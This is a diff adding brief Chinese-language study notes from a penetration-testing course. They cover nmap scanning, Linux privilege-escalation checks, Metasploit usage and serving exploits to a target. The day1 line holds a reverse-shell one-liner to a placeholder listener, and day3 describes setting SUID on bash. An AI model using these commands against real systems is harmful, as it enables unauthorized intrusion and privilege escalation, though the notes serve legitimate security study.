@@ -1,0 +1,15 @@
+近期学习的总结
+
+day1:渗透测试流程
+ip a    nmap -sn  网段      sudo nmap -sS -sV -O -p- T4 目标ip      mysql -u  用户名 -p 密码 -h 目标ip -P 3306       ssh 用户名@主机ip -p 22        gobuster dir -u 网页ip -w 字典路径      
+nmap --script vuln     寻找可利用漏洞         bash -i >& /dev/tcp/接收者ip/监听端口           获取shell
+day2:Linux信息收集与提权
+uname -a（全部信息） -s（内核名称） -n（主机名） -r（内核版本） -v（内核编译信息） -m（显示硬件架构） -p（显示处理器类型） -o（显示操作系统类型）
+cat /etc/os-release（显示操作系统发行版本）
+id         sudo -l     find / -perm -4000 2>/dev/null         
+MSF利用：msfconsole      search漏洞模块      use漏洞      show options    set 配置模块    
+run执行
+day3:Linux信息收集与提权
+计划任务与脚本：cat /etc/crontab 查找可利用漏洞   chmod + s给程序suid权限      bash -p不降权模式
+day4:提权8步：①系统信息②suid③sudo -l④cron⑤弱权限⑥services(mysql/nfs/docker)⑦capabilities⑧kernnel exploit
+day5:burpsuite sqli    uname -a   searchsploit （内核版本）本地下载，打开http服务上传（python3 -m http.server 80），控制靶机下载    解析  chmod + x    运行
